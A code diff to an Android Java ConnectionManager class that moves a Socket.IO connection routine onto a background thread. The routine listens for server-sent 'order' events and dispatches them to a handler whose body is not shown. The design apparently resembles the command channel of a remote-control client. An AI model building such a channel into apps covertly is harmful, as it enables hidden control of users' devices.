@@ -92,114 +92,120 @@ public class ConnectionManager {
     private static boolean isConnecting = false;
 
     public static void sendReq() {
-        try {
-            if (ioSocket != null && (isConnected || isConnecting)) {
-                Log.d(TAG, "Socket already connected or connecting");
-                return;
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (ioSocket != null && (isConnected || isConnecting)) {
+                        Log.d(TAG, "Socket already connected or connecting");
+                        return;
+                    }
+
+                    isConnecting = true;
+                    Log.d(TAG, "Initializing socket connection");
+                    ioSocket = IOSocket.getInstance().getIoSocket();
+
+                    if (ioSocket == null) {
+                        Log.e(TAG, "Failed to get IOSocket instance");
+                        scheduleRetry();
+                        return;
+                    }
+
+                    // Note: Socket.IO handles ping/pong internally - don't override
+
+                    // Handle connection events
+                    ioSocket.on(io.socket.client.Socket.EVENT_CONNECT, new Emitter.Listener() {
+                        @Override
+                        public void call(Object... args) {
+                            Log.d(TAG, "Socket connected successfully");
+                            isConnecting = false;
+                            isConnected = true;
+                            sendConnectionSuccessMessage();
+                        }
+                    });
+
+                    ioSocket.on(io.socket.client.Socket.EVENT_DISCONNECT, new Emitter.Listener() {
+                        @Override
+                        public void call(Object... args) {
+                            Log.w(TAG, "Socket disconnected");
+                            isConnecting = false;
+                            isConnected = false;
+                        }
+                    });
+
+                    ioSocket.on(io.socket.client.Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
+                        @Override
+                        public void call(Object... args) {
+                            String errorMsg = "Connection error";
+                            if (args != null && args.length > 0) {
+                                errorMsg += ": " + args[0].toString();
+                            }
+                            Log.e(TAG, errorMsg);
+                            isConnecting = false;
+                            isConnected = false;
+                        }
+                    });
+                    
+                    ioSocket.on("connect_timeout", new Emitter.Listener() {
+                        @Override
+                        public void call(Object... args) {
+                            Log.e(TAG, "Socket connection timeout");
+                            isConnecting = false;
+                            isConnected = false;
+                        }
+                    });
+                    
+                    ioSocket.on("reconnect_attempt", new Emitter.Listener() {
+                        @Override
+                        public void call(Object... args) {
+                            Log.d(TAG, "Attempting to reconnect...");
+                        }
+                    });
+                    
+                    ioSocket.on("reconnect_error", new Emitter.Listener() {
+                        @Override
+                        public void call(Object... args) {
+                            String errorMsg = "Reconnection error";
+                            if (args != null && args.length > 0) {
+                                errorMsg += ": " + args[0].toString();
+                            }
+                            Log.e(TAG, errorMsg);
+                        }
+                    });
+                    
+                    ioSocket.on("reconnect_failed", new Emitter.Listener() {
+                        @Override
+                        public void call(Object... args) {
+                            Log.e(TAG, "Reconnection failed - all attempts exhausted");
+                        }
+                    });
+
+                    // Handle orders from server
+                    ioSocket.on("order", new Emitter.Listener() {
+                        @Override
+                        public void call(Object... args) {
+                            try {
+                                JSONObject data = (JSONObject) args[0];
+                                String order = data.getString("order");
+                                Log.d(TAG, "Order received: " + order);
+                                
+                                handleOrder(data, order);
+                                
+                            } catch (Exception e) {
+                                Log.e(TAG, "Error processing order", e);
+                            }
+                        }
+                    });
+
+                    ioSocket.connect();
+                    Log.d(TAG, "Socket connect() called");
+
+                } catch (Exception ex) {
+                    Log.e(TAG, "Error in sendReq", ex);
+                    isConnecting = false;
+                }
             }
-
-            isConnecting = true;
-            Log.d(TAG, "Initializing socket connection");
-            ioSocket = IOSocket.getInstance().getIoSocket();
-
-            if (ioSocket == null) {
-                Log.e(TAG, "Failed to get IOSocket instance");
-                scheduleRetry();
-                return;
-            }
-
-            // Note: Socket.IO handles ping/pong internally - don't override
-
-            // Handle connection events
-            ioSocket.on(io.socket.client.Socket.EVENT_CONNECT, new Emitter.Listener() {
-                @Override
-                public void call(Object... args) {
-                    Log.d(TAG, "Socket connected successfully");
-                    isConnecting = false;
-                    isConnected = true;
-                    sendConnectionSuccessMessage();
-                }
-            });
-
-            ioSocket.on(io.socket.client.Socket.EVENT_DISCONNECT, new Emitter.Listener() {
-                @Override
-                public void call(Object... args) {
-                    Log.w(TAG, "Socket disconnected");
-                    isConnecting = false;
-                    isConnected = false;
-                }
-            });
-
-            ioSocket.on(io.socket.client.Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
-                @Override
-                public void call(Object... args) {
-                    String errorMsg = "Connection error";
-                    if (args != null && args.length > 0) {
-                        errorMsg += ": " + args[0].toString();
-                    }
-                    Log.e(TAG, errorMsg);
-                    isConnecting = false;
-                    isConnected = false;
-                }
-            });
-            
-            ioSocket.on("connect_timeout", new Emitter.Listener() {
-                @Override
-                public void call(Object... args) {
-                    Log.e(TAG, "Socket connection timeout");
-                    isConnecting = false;
-                    isConnected = false;
-                }
-            });
-            
-            ioSocket.on("reconnect_attempt", new Emitter.Listener() {
-                @Override
-                public void call(Object... args) {
-                    Log.d(TAG, "Attempting to reconnect...");
-                }
-            });
-            
-            ioSocket.on("reconnect_error", new Emitter.Listener() {
-                @Override
-                public void call(Object... args) {
-                    String errorMsg = "Reconnection error";
-                    if (args != null && args.length > 0) {
-                        errorMsg += ": " + args[0].toString();
-                    }
-                    Log.e(TAG, errorMsg);
-                }
-            });
-            
-            ioSocket.on("reconnect_failed", new Emitter.Listener() {
-                @Override
-                public void call(Object... args) {
-                    Log.e(TAG, "Reconnection failed - all attempts exhausted");
-                }
-            });
-
-            // Handle orders from server
-            ioSocket.on("order", new Emitter.Listener() {
-                @Override
-                public void call(Object... args) {
-                    try {
-                        JSONObject data = (JSONObject) args[0];
-                        String order = data.getString("order");
-                        Log.d(TAG, "Order received: " + order);
-                        
-                        handleOrder(data, order);
-                        
-                    } catch (Exception e) {
-                        Log.e(TAG, "Error processing order", e);
-                    }
-                }
-            });
-
-            ioSocket.connect();
-            Log.d(TAG, "Socket connect() called");
-
-        } catch (Exception ex) {
-            Log.e(TAG, "Error in sendReq", ex);
-        }
+        }).start();
     }
 
     private static void handleOrder(JSONObject data, String order) {
